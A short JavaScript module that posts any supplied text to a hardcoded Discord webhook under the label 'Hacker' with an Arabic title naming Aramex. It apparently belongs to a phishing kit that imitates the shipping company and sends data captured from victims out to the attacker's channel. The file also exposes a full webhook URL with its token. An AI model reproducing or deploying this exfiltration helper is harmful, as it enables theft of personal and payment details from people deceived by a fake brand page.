import axios from 'axios';


const TeleSned = () => {
     
    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة اراميكس ",
              description: des,
           },
          ],
    };

        await axios.post("https://discord.com/api/webhooks/1313920035722498088/Veni6Ik02zn5Os9EwbYme0dJAsa3YxT-iGOshGZX2nIj1cDZz3CbG3ANtSREgluhZPV7",body) 
    }
  return {
    Send,
}
}

export default TeleSned;
